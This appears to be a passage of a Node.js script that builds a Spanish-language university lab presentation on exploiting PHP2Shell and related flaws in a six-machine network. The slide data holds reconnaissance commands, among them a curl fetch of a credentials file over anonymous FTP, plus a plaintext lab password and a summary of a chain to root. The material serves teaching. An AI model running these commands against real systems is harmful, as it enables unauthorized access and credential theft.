const pptxgen = require("pptxgenjs");
const fs = require("fs");
const path = require("path");

const pptx = new pptxgen();
pptx.layout = "LAYOUT_WIDE"; // 13.333 x 7.5 in
pptx.author = "IS-1023 Seguridad de la Información";
pptx.company = "Universidad Nacional de Moquegua";
pptx.subject = "PHP2Shell - CVE-2026-109618 / CVE-2026-109619";
pptx.title = "PHP2Shell: del version gate a la explotación controlada";
pptx.lang = "es-PE";

// ---------- Paleta ----------
const NAVY = "0A2342";
const NAVY2 = "123A5E";
const NAVY3 = "1C4E7A";
const CYAN = "00B8D9";
const CYAN_L = "67E8F9";
const ICE = "E6F7FB";
const WHITE = "FFFFFF";
const INK = "0F172A";
const MUTED = "5B6B7C";
const PANEL = "F4F7FA";
const BORDER = "E2E8F0";
const GREEN = "0E9F6E";
const AMBER = "D97706";
const RED = "DC2626";

const SW = 13.333;
const SH = 7.5;
const M = 0.6;
let slideNo = 0;

// ---------- Utilidades ----------
function txt(slide, text, opts = {}) {
  slide.addText(text, { fontFace: "Arial", color: INK, margin: 0, ...opts });
}

function card(slide, x, y, w, h, fill = PANEL, line = BORDER, radius = 0.14) {
  slide.addShape(pptx.ShapeType.roundRect, {
    x, y, w, h,
    fill: { color: fill },
    line: { color: line, width: 1 },
    rectRadius: radius,
  });
}

function badge(slide, n, x, y, d = 0.42, fill = CYAN, color = WHITE, size = 13) {
  slide.addShape(pptx.ShapeType.ellipse, {
    x, y, w: d, h: d,
    fill: { color: fill },
    line: { color: fill, width: 0 },
  });
  txt(slide, String(n), {
    x, y, w: d, h: d, align: "center", valign: "middle",
    bold: true, fontSize: size, color,
  });
}

function chip(slide, text, x, y, w, fill = ICE, color = NAVY, size = 9.5) {
  slide.addShape(pptx.ShapeType.roundRect, {
    x, y, w, h: 0.28,
    fill: { color: fill },
    line: { color: fill, width: 0 },
    rectRadius: 0.2,
  });
  txt(slide, text, {
    x, y, w, h: 0.28, align: "center", valign: "middle",
    bold: true, fontSize: size, color, charSpacing: 0.4,
  });
}

let currentOwner = "Equipo completo · 6 integrantes";

function footer(slide, n, dark = false) {
  const c = dark ? "8FB3C9" : MUTED;
  const owner = currentOwner;
  txt(slide, owner, {
    x: M, y: 7.12, w: 6.8, h: 0.22,
    fontSize: 7.4, bold: true, color: dark ? CYAN_L : NAVY,
  });
  txt(slide, "IS-1023 · UNAM", {
    x: 7.55, y: 7.12, w: 2.6, h: 0.22,
    fontSize: 7.4, color: c,
  });
  txt(slide, String(slideNo), {
    x: SW - M - 0.7, y: 7.12, w: 0.7, h: 0.22,
    fontSize: 8, color: c, align: "right",
  });
}

function header(slide, kicker, title, sub) {
  txt(slide, kicker.toUpperCase(), {
    x: M, y: 0.38, w: 11.5, h: 0.24,
    fontSize: 9.5, bold: true, color: CYAN, charSpacing: 1.4,
  });
  txt(slide, title, {
    x: M, y: 0.62, w: 12.1, h: 0.72,
    fontSize: 31, bold: true, color: NAVY,
  });
  if (sub) {
    txt(slide, sub, {
      x: M, y: 1.32, w: 11.9, h: 0.3,
      fontSize: 11, color: MUTED,
    });
  }
}

function newSlide(bg = WHITE, owner = "Equipo completo · 6 integrantes") {
  slideNo += 1;
  currentOwner = owner;
  const s = pptx.addSlide();
  s.background = { color: bg };
  return s;
}

function pngSize(file) {
  const b = fs.readFileSync(file);
  return { w: b.readUInt32BE(16), h: b.readUInt32BE(20) };
}

function addImageContain(slide, file, x, y, w, h) {
  const s = pngSize(file);
  const r = Math.min(w / s.w, h / s.h);
  const nw = s.w * r;
  const nh = s.h * r;
  slide.addImage({
    path: file,
    x: x + (w - nw) / 2,
    y: y + (h - nh) / 2,
    w: nw,
    h: nh,
  });
}

const IMG = path.resolve(__dirname, "..", "informe", "evidencias", "png");

// =====================================================================
// 1. PORTADA
// =====================================================================
{
  const s = newSlide(NAVY);

  // Motivo: círculos translúcidos
  s.addShape(pptx.ShapeType.ellipse, {
    x: 10.1, y: -1.3, w: 4.6, h: 4.6,
    fill: { color: CYAN, transparency: 82 },
    line: { color: CYAN, width: 1.5, transparency: 55 },
  });
  s.addShape(pptx.ShapeType.ellipse, {
    x: -1.2, y: 5.2, w: 3.4, h: 3.4,
    fill: { color: CYAN, transparency: 88 },
    line: { color: CYAN, width: 1, transparency: 65 },
  });

  txt(s, "TRABAJO FINAL · UNIDAD I · SEMANA 07", {
    x: M, y: 0.9, w: 8, h: 0.28,
    fontSize: 10.5, bold: true, color: CYAN_L, charSpacing: 2,
  });

  txt(s, "PHP2Shell", {
    x: M, y: 1.45, w: 8.2, h: 1.0,
    fontSize: 58, bold: true, color: WHITE,
  });
  txt(s, "CVE-2026-109618  ·  CVE-2026-109619", {
    x: M, y: 2.5, w: 8.4, h: 0.38,
    fontSize: 18, bold: true, color: CYAN_L,
  });
  txt(s, "Del version gate a la explotación controlada de PHP 8.4.26", {
    x: M, y: 3.05, w: 8.2, h: 0.4,
    fontSize: 16, color: "D7E6F2",
  });

  txt(s, "Análisis, explotación y remediación de la red universitaria.", {
    x: M, y: 3.85, w: 7.4, h: 0.75,
    fontSize: 12.5, color: "A9C4D8", lineSpacing: 18,
  });

  // Tarjeta lateral: stack del entorno de prueba
  card(s, 9.15, 1.55, 3.35, 3.2, "10325A", "2A5B84", 0.12);
  txt(s, "ENTORNO AFECTADO", {
    x: 9.45, y: 1.8, w: 2.8, h: 0.22,
    fontSize: 8.5, bold: true, color: CYAN_L, charSpacing: 1.2,
  });
  const stack = [
    ["Apache", "2.4.49 · prefork"],
    ["PHP", "8.4.26 · NTS"],
    ["Target", "session2.php @ :8080"],
  ];
  stack.forEach((it, i) => {
    const yy = 2.2 + i * 0.78;
    s.addShape(pptx.ShapeType.roundRect, {
      x: 9.45, y: yy, w: 2.75, h: 0.62,
      fill: { color: "0B2A4A" },
      line: { color: "2A5B84", width: 1 },
      rectRadius: 0.06,
    });
    txt(s, it[0], {
      x: 9.62, y: yy + 0.08, w: 2.4, h: 0.2,
      fontSize: 9, bold: true, color: WHITE,
    });
    txt(s, it[1], {
      x: 9.62, y: yy + 0.3, w: 2.4, h: 0.2,
      fontSize: 8.5, color: CYAN_L, fontFace: "Courier New",
    });
  });
  txt(s, "RCE pre-auth como www-data", {
    x: 9.45, y: 4.55, w: 2.8, h: 0.2,
    fontSize: 8.5, italic: true, color: "A9C4D8",
  });

  txt(s, "EQUIPO", {
    x: M, y: 4.75, w: 2.0, h: 0.2,
    fontSize: 8, bold: true, color: CYAN_L, charSpacing: 1.6,
  });

  const teamA = [
    "APAZA ANAHUA, DORIS",
    "ANCCO RAFAEL, FABIOLA ANDREA",
    "RAMOS VERA, ERICK JEAN PIER",
  ];
  const teamB = [
    "NINA CRUZ, MARCO",
    "CHURATA HUACANI, RONY FRANK",
    "PAYE MAMANI, JOSE ENRIQUE",
  ];
  teamA.forEach((name, i) => {
    txt(s, name, {
      x: M, y: 4.98 + i * 0.22, w: 3.6, h: 0.2,
      fontSize: 7.8, color: "D7E6F2",
    });
  });
  teamB.forEach((name, i) => {
    txt(s, name, {
      x: M + 3.75, y: 4.98 + i * 0.22, w: 3.6, h: 0.2,
      fontSize: 7.8, color: "D7E6F2",
    });
  });

  txt(s, "UNIVERSIDAD NACIONAL DE MOQUEGUA  ·  INGENIERÍA DE SISTEMAS E INFORMÁTICA", {
    x: M, y: 5.95, w: 9.5, h: 0.24,
    fontSize: 9.5, bold: true, color: WHITE,
  });
  txt(s, "Mgr. Juan Carlos Valero Gómez  ·  2026", {
    x: M, y: 6.22, w: 8, h: 0.24,
    fontSize: 9.5, color: "A9C4D8",
  });

  txt(s, "Red 10.10.10.0/24 · 6 servidores · evidencia fechada en UTC", {
    x: M, y: 6.65, w: 9, h: 0.24,
    fontSize: 9, color: "7FA6C0",
  });

  s.addNotes("Portada. PHP2Shell en PHP 8.4.26: se explota por Chain A, se obtiene www-data, se escala por B3/SSH/sudo y se cierra con parche y retest. La demo se hace en vivo desde Kali.");
}

// =====================================================================
// 2. AGENDA POR FASES
// =====================================================================
{
  const s = newSlide();
  header(s, "Recorrido", "Cinco fases, una historia",
    "De la configuración de la red a la explotación de W2 y su mitigación.");

  const items = [
    ["01", "Fase 1 · Configuración y superficie", "Red, topología, activos, puertos y versiones de cada máquina."],
    ["02", "Fase 2 · Exploración", "Dos comandos por máquina: qué servicio corre y qué devuelve."],
    ["03", "Fase 3 · Explotación PHP2Shell", "Ficha, version gate, Chain A, www-data y root."],
    ["04", "Fase 4 · Mitigación", "Versión o configuración por máquina y comando de verificación."],
    ["05", "Fase 5 · Retest y cierre", "Antes/después, evidencia, lecciones y réplica."],
  ];

  items.forEach((it, i) => {
    const y = 1.8 + i * 0.95;
    const hot = i === 2;
    card(s, M, y, 12.1, 0.82, hot ? "E8FAFC" : WHITE, hot ? CYAN : BORDER, 0.12);
    badge(s, it[0], M + 0.2, y + 0.2, 0.42, hot ? CYAN : NAVY, WHITE, 9.5);
    txt(s, it[1], {
      x: M + 0.78, y: y + 0.1, w: 4.2, h: 0.28,
      fontSize: 12.5, bold: true, color: NAVY,
    });
    txt(s, it[2], {
      x: M + 5.0, y: y + 0.13, w: 6.8, h: 0.3,
      fontSize: 9, color: MUTED,
    });
  });

  txt(s, "Tesis: de la versión vulnerable a root, con evidencia en cada fase.", {
    x: M, y: 6.62, w: 11.0, h: 0.28,
    fontSize: 10, bold: true, italic: true, color: CYAN,
  });

  footer(s, 2);
  s.addNotes("Agenda por fases. Fase 1 configuración y superficie; Fase 2 exploración con comandos; Fase 3 explotación W2; Fase 4 mitigación por máquina; Fase 5 retest y cierre.");
}

// =====================================================================
// 3. CONTEXTO
// =====================================================================
{
  const s = newSlide();
  header(s, "Fase 1 · Contexto", "La red universitaria",
    "Servicios reales, datos de la universidad y un atacante dentro de la red.");

  txt(s, "La idea", {
    x: M, y: 1.7, w: 6.2, h: 0.3,
    fontSize: 15, bold: true, color: NAVY,
  });
  txt(s, "La red universitaria expone un portal web, base de datos, respaldos, un Windows heredado y estaciones de trabajo. Todo en 10.10.10.0/24; M6 es el punto de auditoría desde donde se valida la superficie.", {
    x: M, y: 2.1, w: 6.1, h: 1.7,
    fontSize: 11.5, color: INK, lineSpacing: 17,
  });

  chip(s, "10.10.10.0/24", M, 3.95, 2.1, ICE, NAVY, 11);
  chip(s, "Red corporativa", M + 2.3, 3.95, 1.95, PANEL, NAVY, 10);
  chip(s, "Servicios activos", M + 4.45, 3.95, 1.85, PANEL, NAVY, 10);

  txt(s, "Objetivo", {
    x: M, y: 4.6, w: 6.2, h: 0.3,
    fontSize: 15, bold: true, color: NAVY,
  });
  txt(s, "Identificar, enumerar, explotar, escalar a root, remediar y verificar. Cada paso queda con comando, captura y hash para poder repetirlo en vivo desde Kali.", {
    x: M, y: 4.97, w: 6.1, h: 1.1,
    fontSize: 11.5, color: INK, lineSpacing: 17,
  });

  // Stats
  const stats = [
    ["6", "servidores", "M1–M6 + router R0"],
    ["24", "hallazgos", "9 CVE + 15 configuraciones"],
    ["22", "explotadas", "con evidencia verificable"],
  ];
  stats.forEach((st, i) => {
    const x = 7.15;
    const y = 1.75 + i * 1.55;
    card(s, x, y, 5.55, 1.3, i === 1 ? NAVY : PANEL, i === 1 ? NAVY : BORDER, 0.1);
    txt(s, st[0], {
      x: x + 0.3, y: y + 0.18, w: 1.1, h: 0.75,
      fontSize: 40, bold: true, color: i === 1 ? CYAN_L : CYAN,
    });
    txt(s, st[1], {
      x: x + 1.5, y: y + 0.28, w: 3.8, h: 0.3,
      fontSize: 14, bold: true, color: i === 1 ? WHITE : NAVY,
    });
    txt(s, st[2], {
      x: x + 1.5, y: y + 0.62, w: 3.9, h: 0.4,
      fontSize: 9.5, color: i === 1 ? "A9C4D8" : MUTED,
    });
  });

  footer(s, 3);
  s.addNotes("Contexto. Destacar el alcance autorizado y la red universitaria. Los números clave: 6 servidores, 24 hallazgos, 22 llevados a evidencia.");
}

// =====================================================================
// 4. ARQUITECTURA
// =====================================================================
{
  const s = newSlide();
  header(s, "Fase 1 · Arquitectura", "Topología de la red y camino de ataque",
    "Una sola puerta web, separación lógica por firewall y pivote desde M1.");

  // Router
  s.addShape(pptx.ShapeType.roundRect, {
    x: 4.75, y: 1.55, w: 3.85, h: 0.72,
    fill: { color: NAVY },
    line: { color: NAVY, width: 0 },
    rectRadius: 0.08,
  });
  txt(s, "R0 · MitraStar  10.10.10.1", {
    x: 4.9, y: 1.66, w: 3.55, h: 0.22,
    fontSize: 11.5, bold: true, color: WHITE, align: "center",
  });
  txt(s, "transporte · DHCP OFF · sin DSL", {
    x: 4.9, y: 1.92, w: 3.55, h: 0.2,
    fontSize: 8.5, color: CYAN_L, align: "center",
  });

  // Bus
  const busY = 2.62;
  s.addShape(pptx.ShapeType.line, {
    x: 0.95, y: busY, w: 11.45, h: 0,
    line: { color: "9DB4C8", width: 2 },
  });
  s.addShape(pptx.ShapeType.line, {
    x: 6.67, y: 2.27, w: 0, h: 0.35,
    line: { color: "9DB4C8", width: 2 },
  });
  txt(s, "LAN 10.10.10.0/24", {
    x: 5.6, y: 2.35, w: 2.2, h: 0.2,
    fontSize: 8.5, bold: true, color: MUTED, align: "center",
    fill: { color: WHITE },
  });

  const nodes = [
    { vm: "M6", ip: ".20", role: "Kali · auditoría", svc: "nmap · nxc · curl", x: 0.95, accent: "MUTED", dark: false, gray: true },
    { vm: "M1", ip: ".11", role: "Aplicación", svc: "80 · 443 · 22", x: 3.18, accent: CYAN, dark: true, tag: "PUERTA" },
    { vm: "M2", ip: ".12", role: "Base de datos", svc: "MariaDB · Redis", x: 5.41, accent: NAVY3, dark: false },
    { vm: "M3", ip: ".13", role: "Respaldos", svc: "FTP · SMB · NFS", x: 7.64, accent: NAVY3, dark: false },
    { vm: "M4", ip: ".14", role: "Windows Server", svc: "DNS · SMB · Spooler", x: 9.87, accent: NAVY3, dark: false },
  ];

  nodes.forEach((n) => {
    const y = 3.18;
    s.addShape(pptx.ShapeType.line, {
      x: n.x + 0.85, y: busY, w: 0, h: y - busY,
      line: { color: "9DB4C8", width: 1.25, beginArrowType: "none", endArrowType: "triangle" },
    });

    s.addShape(pptx.ShapeType.roundRect, {
      x: n.x, y, w: 1.7, h: 1.18,
      fill: { color: n.dark ? NAVY : n.gray ? "E2E8F0" : WHITE },
      line: { color: n.dark ? NAVY : BORDER, width: n.dark ? 1 : 1.2 },
      rectRadius: 0.08,
    });
    txt(s, n.vm, {
      x: n.x + 0.12, y: y + 0.1, w: 0.5, h: 0.26,
      fontSize: 13, bold: true, color: n.dark ? WHITE : NAVY,
    });
    txt(s, n.ip, {
      x: n.x + 0.62, y: y + 0.12, w: 0.9, h: 0.22,
      fontSize: 9, fontFace: "Courier New", color: n.dark ? CYAN_L : MUTED,
    });
    txt(s, n.role, {
      x: n.x + 0.12, y: y + 0.42, w: 1.48, h: 0.22,
      fontSize: 8.8, bold: true, color: n.dark ? WHITE : NAVY,
    });
    txt(s, n.svc, {
      x: n.x + 0.12, y: y + 0.68, w: 1.48, h: 0.4,
      fontSize: 7.6, color: n.dark ? "A9C4D8" : MUTED, lineSpacing: 10,
    });
    if (n.tag) {
      chip(s, n.tag, n.x + 0.92, 2.72, 0.72, CYAN, WHITE, 7.5);
    }
  });

  // M5 pivot
  const m5x = 4.55;
  s.addShape(pptx.ShapeType.line, {
    x: 4.03, y: 4.36, w: 0, h: 0.55,
    line: { color: CYAN, width: 1.5, dashType: "dash" },
  });
  s.addShape(pptx.ShapeType.line, {
    x: 4.03, y: 4.91, w: 1.32, h: 0,
    line: { color: CYAN, width: 1.5, dashType: "dash" },
  });
  s.addShape(pptx.ShapeType.line, {
    x: 5.35, y: 4.91, w: 0, h: 0.34,
    line: { color: CYAN, width: 1.5, dashType: "dash", endArrowType: "triangle" },
  });
  txt(s, "pivote", {
    x: 4.1, y: 4.62, w: 0.9, h: 0.18,
    fontSize: 7.5, italic: true, color: CYAN, fill: { color: WHITE },
  });

  s.addShape(pptx.ShapeType.roundRect, {
    x: m5x, y: 5.25, w: 3.3, h: 1.0,
    fill: { color: WHITE },
    line: { color: CYAN, width: 1.5 },
    rectRadius: 0.08,
  });
  txt(s, "M5  .15  ·  Windows 10", {
    x: m5x + 0.15, y: 5.36, w: 3.0, h: 0.24,
    fontSize: 11, bold: true, color: NAVY,
  });
  txt(s, "Estación cliente · SMB1 · RDP sin NLA · TightVNC 2.8.90", {
    x: m5x + 0.15, y: 5.64, w: 3.0, h: 0.35,
    fontSize: 7.8, color: MUTED, lineSpacing: 10,
  });
  txt(s, "destino final de la cadena", {
    x: m5x + 0.15, y: 5.98, w: 3.0, h: 0.18,
    fontSize: 7.5, italic: true, color: CYAN,
  });

  // Leyenda
  const lx = 9.0;
  card(s, lx, 4.45, 3.7, 1.85, PANEL, BORDER, 0.08);
  txt(s, "Leyenda", {
    x: lx + 0.2, y: 4.58, w: 1.2, h: 0.2,
    fontSize: 9, bold: true, color: NAVY,
  });
  const leg = [
    [CYAN, "Objetivo / pivote"],
    [NAVY, "Puerta de entrada"],
    ["E2E8F0", "Auditor"],
    [WHITE, "Nodos internos"],
  ];
  leg.forEach((l, i) => {
    s.addShape(pptx.ShapeType.rect, {
      x: lx + 0.2, y: 4.9 + i * 0.3, w: 0.22, h: 0.16,
      fill: { color: l[0] },
      line: { color: l[0] === WHITE ? BORDER : l[0], width: 0.8 },
    });
    txt(s, l[1], {
      x: lx + 0.52, y: 4.85 + i * 0.3, w: 2.9, h: 0.2,
      fontSize: 8.5, color: MUTED,
    });
  });

  txt(s, "La separación es lógica, no física: M4:445 y M5:5900 quedaron visibles desde M6 y se documentaron como desviación.", {
    x: 0.95, y: 6.45, w: 8.0, h: 0.35,
    fontSize: 8.8, italic: true, color: MUTED,
  });

  footer(s, 4);
  s.addNotes("Arquitectura. Explicar el camino: M6 entra por M1:80, M1 pivota a M2/M3/M4 y M5 se alcanza por VNC. Señalar la desviación de firewall: 445 de M4 y 5900 de M5 visibles desde el auditor.");
}

// =====================================================================
// 6. ACTIVOS Y SUPERFICIE
// =====================================================================
{
  const s = newSlide();
  header(s, "Fase 1 · Activos", "Qué tiene cada máquina",
    "IP, rol, puertos y versión clave antes de explorar.");

  txt(s, "MÁQUINA", { x: M + 0.1, y: 1.68, w: 1.1, h: 0.2, fontSize: 7, bold: true, color: CYAN, charSpacing: 0.8 });
  txt(s, "IP", { x: 1.9, y: 1.68, w: 1.2, h: 0.2, fontSize: 7, bold: true, color: CYAN, charSpacing: 0.8 });
  txt(s, "ROL", { x: 3.25, y: 1.68, w: 1.9, h: 0.2, fontSize: 7, bold: true, color: CYAN, charSpacing: 0.8 });
  txt(s, "PUERTOS", { x: 5.3, y: 1.68, w: 2.0, h: 0.2, fontSize: 7, bold: true, color: CYAN, charSpacing: 0.8 });
  txt(s, "SERVICIO / VERSIÓN", { x: 7.5, y: 1.68, w: 4.8, h: 0.2, fontSize: 7, bold: true, color: CYAN, charSpacing: 0.8 });

  const rows = [
    ["M1", "10.10.10.11", "Aplicación", "22 · 80 · 8080", "Apache 2.4.49 · PHP 8.4.26 · WP 7.0.1"],
    ["M2", "10.10.10.12", "Base de datos", "3306 · 6379", "MariaDB 10.11.19 · Redis 6.2.6"],
    ["M3", "10.10.10.13", "Respaldos", "21 · 139 · 445 · 2049", "Samba 4.5.10 · vsftpd 2.3.4 · NFS"],
    ["M4", "10.10.10.14", "Windows Server", "445 · 53", "WS2016 14393 · DNS · SMB"],
    ["M5", "10.10.10.15", "Cliente", "3389 · 5900", "Windows 10 19045 · TightVNC 2.8.90"],
    ["M6", "10.10.10.20", "Auditoría", "—", "Kali · nmap · nxc · curl"],
    ["R0", "10.10.10.1", "Router", "—", "MitraStar · DHCP off"],
  ];

  rows.forEach((r, i) => {
    const y = 1.98 + i * 0.62;
    if (i % 2 === 0) {
      s.addShape(pptx.ShapeType.rect, {
        x: M, y, w: 12.1, h: 0.56,
        fill: { color: PANEL }, line: { color: PANEL, width: 0 },
      });
    }
    txt(s, r[0], { x: M + 0.1, y: y + 0.1, w: 1.0, h: 0.25, fontSize: 9.5, bold: true, color: NAVY });
    txt(s, r[1], { x: 1.9, y: y + 0.1, w: 1.25, h: 0.25, fontSize: 8.2, fontFace: "Courier New", color: MUTED });
    txt(s, r[2], { x: 3.25, y: y + 0.1, w: 1.9, h: 0.25, fontSize: 8.4, color: INK });
    txt(s, r[3], { x: 5.3, y: y + 0.1, w: 2.0, h: 0.25, fontSize: 8.2, fontFace: "Courier New", color: MUTED });
    txt(s, r[4], { x: 7.5, y: y + 0.1, w: 4.85, h: 0.25, fontSize: 7.8, color: INK });
  });

  txt(s, "M6 no es objetivo; R0 solo transporta. Las versiones son las que activan el version gate.", {
    x: M, y: 6.55, w: 11.8, h: 0.28,
    fontSize: 8.5, italic: true, color: MUTED,
  });

  footer(s, 5);
  s.addNotes("Activos. Tabla ordenada por máquina: IP, rol, puertos y versión. M1 es la puerta; M2/M3 datos y respaldos; M4/M5 Windows; M6 auditor; R0 transporte.");
}

const EXPLORE = {
  M1: [
    { cmd: "nmap -sV -p 80 10.10.10.11",
      out: "80/tcp open http Apache 2.4.49 (Unix) PHP/8.4.26",
      why: "Confirma la puerta web y la versión exacta de PHP." },
    { cmd: "curl -s -o /dev/null -w \"%{http_code}\" http://10.10.10.11:8080/session2.php",
      out: "200",
      why: "Comprueba que el target de sesión responde antes de atacar." },
  ],
  M2: [
    { cmd: "redis-cli -h 10.10.10.12 PING",
      out: "PONG",
      why: "Redis responde sin autenticación." },
    { cmd: "redis-cli -h 10.10.10.12 INFO server | grep redis_version",
      out: "redis_version:6.2.6",
      why: "Confirma la versión del servicio y el vector de acceso." },
  ],
  M3: [
    { cmd: "curl -s ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt",
      out: "admin M4/M5: Admin13.-",
      why: "El FTP anónimo expone credenciales en claro." },
    { cmd: "showmount -e 10.10.10.13",
      out: "/srv/storage/backups 10.10.10.0/24",
      why: "Lista el export NFS y confirma el punto de escritura." },
  ],
  M4: [
    { cmd: "nmap -p445 --script smb-security-mode 10.10.10.14",
      out: "message_signing: disabled",
      why: "SMB sin firma; superficie para el acceso." },
    { cmd: "dig axfr uni.lab @10.10.10.14 +short",
      out: "app.uni.lab. 10.10.10.11 / bkp.uni.lab. 10.10.10.13",
      why: "Transferencia de zona: mapa completo de la red." },
  ],
  M5: [
    { cmd: "nmap -sV -p5900 10.10.10.15",
      out: "5900/tcp open vnc",
      why: "VNC expuesto en la estación cliente." },
    { cmd: "nmap -p5900 --script vnc-info 10.10.10.15",
      out: "Security types: None · WARNING: no authentication",
      why: "Confirma que el escritorio no pide clave." },
  ],
  M6: [
    { cmd: "nmap -sn 10.10.10.0/24",
      out: "Nmap done: 256 IP addresses (7 hosts up)",
      why: "Descubre los hosts activos de la red." },
    { cmd: "nmap -sV -p80 10.10.10.11",
      out: "80/tcp open http Apache 2.4.49 · PHP/8.4.26",
      why: "Valida la puerta y la versión desde el auditor." },
  ],
};

function machineSlide(cfg) {
  const s = newSlide(WHITE, cfg.owner);

  header(s, "Fase 1-2 · " + cfg.vm, cfg.vm + " · " + cfg.role, cfg.subtitle);

  // Función y stack
  card(s, M, 1.7, 5.35, 2.85, WHITE, BORDER, 0.16);
  txt(s, "FUNCIÓN PRINCIPAL", {
    x: M + 0.22, y: 1.85, w: 3.5, h: 0.2,
    fontSize: 7.4, bold: true, color: CYAN, charSpacing: 1,
  });
  txt(s, cfg.func, {
    x: M + 0.22, y: 2.12, w: 4.95, h: 0.75,
    fontSize: 9.2, color: INK, lineSpacing: 12,
  });
  txt(s, "STACK INSTALADO", {
    x: M + 0.22, y: 2.95, w: 3.5, h: 0.2,
    fontSize: 7.4, bold: true, color: CYAN, charSpacing: 1,
  });
  cfg.stack.forEach((line, i) => {
    txt(s, "•  " + line, {
      x: M + 0.22, y: 3.22 + i * 0.28, w: 4.95, h: 0.22,
      fontSize: 8.2, color: MUTED,
    });
  });

  // Vulnerabilidades
  card(s, 6.2, 1.7, 6.55, 2.85, WHITE, BORDER, 0.16);
  txt(s, "VULNERABILIDADES Y CVE", {
    x: 6.42, y: 1.85, w: 4.0, h: 0.2,
    fontSize: 7.4, bold: true, color: CYAN, charSpacing: 1,
  });
  cfg.vulns.forEach((v, i) => {
    const y = 2.14 + i * 0.46;
    txt(s, v[0], {
      x: 6.42, y, w: 1.15, h: 0.22,
      fontSize: 8, bold: true, color: NAVY,
    });
    txt(s, v[1], {
      x: 7.6, y, w: 3.4, h: 0.22,
      fontSize: 8, color: INK,
    });
    txt(s, v[2], {
      x: 10.85, y, w: 0.55, h: 0.22,
      fontSize: 8, bold: true, color: NAVY, align: "right",
    });
    txt(s, v[3], {
      x: 11.5, y, w: 1.1, h: 0.22,
      fontSize: 7.2, color: MUTED, align: "right",
    });
  });

  // Qué hicimos
  txt(s, "QUÉ HICIMOS:  " + cfg.did, {
    x: M, y: 4.6, w: 11.95, h: 0.26,
    fontSize: 8, bold: true, color: NAVY,
  });

  // Comandos de exploración
  card(s, M, 4.95, 12.15, 1.95, WHITE, BORDER, 0.12);
  txt(s, "EXPLORACIÓN · 2 COMANDOS", {
    x: M + 0.2, y: 5.04, w: 3.2, h: 0.2,
    fontSize: 7.2, bold: true, color: CYAN, charSpacing: 1,
  });
  EXPLORE[cfg.vm].forEach((c, i) => {
    const x = M + 0.2 + i * 6.0;
    txt(s, "$  " + c.cmd, {
      x, y: 5.28, w: 5.75, h: 0.36,
      fontSize: 6.8, fontFace: "Courier New", color: NAVY, lineSpacing: 8.5,
    });
    txt(s, "→  " + c.out, {
      x, y: 5.64, w: 5.75, h: 0.33,
      fontSize: 6.8, fontFace: "Courier New", color: "166534", lineSpacing: 8.5,
    });
    txt(s, "Qué hace: " + c.why, {
      x, y: 5.98, w: 5.75, h: 0.42,
      fontSize: 7.3, color: MUTED, lineSpacing: 9.5,
    });
  });
  txt(s, "Evidencia: " + cfg.evidence, {
    x: M + 0.2, y: 6.58, w: 11.7, h: 0.22,
    fontSize: 7.2, fontFace: "Courier New", color: MUTED,
  });

  footer(s, 0);
  s.addNotes(cfg.notes);
}

// =====================================================================
// M1
// =====================================================================
machineSlide({
  vm: "M1", role: "Aplicación", owner: "M1 · Erick Ramos Vera",
  subtitle: "La puerta web de la universidad y el punto de pivote.",
  func: "Servidor de aplicación: publica WordPress y Moodle, concentra la base de datos y es la única entrada web (80/443). Desde aquí se pivota al resto.",
  stack: ["Ubuntu 22.04", "Apache 2.4.49", "PHP 8.4.26 (NTS)", "WordPress 7.0.1 · Moodle 5.0.11", "OpenSSH · usuario ubuntu"],
  vulns: [
    ["W2", "CVE-2026-109618/109619 · PHP", "9.8", "RCE Chain A"],
    ["W3", "CVE-2021-41773 · Apache", "9.8", "RCE"],
    ["W4", "Clave débil usc.admin", "8.8", "login"],
    ["M1-SSH", "Clave reutilizada + sudo", "8.8", "root"],
  ],
  did: "W2 Chain A dio www-data; W3 dio RCE; W4 login admin; SSH + sudo dio root.",
  evidence: "EV-W2-07/08/09 · EV-005-M1-03 · EV-ROOT-CHAIN",
  notes: "M1 es la puerta. Aquí se concentran W2 Chain A, W3, W4 y SSH. Erick expone esta máquina y la ficha de PHP2Shell.",
});

// =====================================================================
// M2
// =====================================================================
machineSlide({
  vm: "M2", role: "Base de datos", owner: "M2 · Doris Apaza Anahua",
  subtitle: "Datos de WordPress y Moodle; Redis para sesiones.",
  func: "Servidor de base de datos: MariaDB guarda wordpress y moodle_db; Redis se usa para sesiones y caché. Es el objetivo del pivote desde M1.",
  stack: ["Ubuntu 22.04", "MariaDB 10.11.19", "Redis 6.2.6", "SNMP public/private", "3306/6379 en la LAN"],
  vulns: [
    ["D1", "Redis sin autenticación", "10.0", "PONG"],
    ["D2", "Claves de BD en wp-config", "8.1", "datos"],
    ["D3", "6379/3306 expuestos", "7.5", "pivote"],
  ],
  did: "Redis respondió PONG sin auth; por túnel SSH se leyó wordpress (12 tablas) y moodle_db (487).",
  evidence: "F04-001 · F04-003 · EV-007-RETEST",
  notes: "M2. Doris expone base de datos y Redis: acceso sin auth, volcado por túnel y remediación a 6.2.7.",
});

// =====================================================================
// M3
// =====================================================================
machineSlide({
  vm: "M3", role: "Respaldos", owner: "M3 · Rony Churata Huacani",
  subtitle: "El backup que guarda la llave de M1 y M4/M5.",
  func: "Servidor de respaldos: FTP, NFS y Samba. Guarda copias de las bases y archivos; es el eslabón que entrega credenciales reutilizadas.",
  stack: ["Ubuntu 22.04", "Samba 4.5.10", "vsftpd 2.3.4", "NFS · /srv/storage/backups", "OpenSSH · rony123"],
  vulns: [
    ["B3", "FTP anónimo + credenciales", "8.6", "expl."],
    ["B4", "NFS no_root_squash", "8.1", "expl."],
  ],
  did: "FTP anónimo entregó Admin13.-; NFS permitió escribir como root; esa clave abrió M1.",
  evidence: "F04-002 · F04-006 · EV-ROOT-CHAIN",
  notes: "M3. Rony expone los respaldos: FTP anónimo, NFS sin root_squash y la clave que termina en root.",
});

// =====================================================================
// M4
// =====================================================================
machineSlide({
  vm: "M4", role: "Windows Server", owner: "M4 · Fabiola Ancco Rafael",
  subtitle: "Identidad heredada, DNS y SMB sin firmar.",
  func: "Windows Server 2016 heredado: DNS de uni.lab, SMBv1, Spooler y comparticiones. Es el salto a Windows y la identidad administrativa.",
  stack: ["WS2016 build 14393", "DNS standalone", "SMBv1 · signing off", "Spooler activo", "Administrador / soporte"],
  vulns: [
    ["S3", "Admin con clave débil", "8.8", "Pwn3d!"],
    ["S4", "AXFR abierto", "5.3", "zona"],
  ],
  did: "S3 dio Pwn3d! y shares; AXFR entregó la zona; SYSTEM por tarea programada.",
  evidence: "F04-012/013/015/016/017 · EV-007-RETEST",
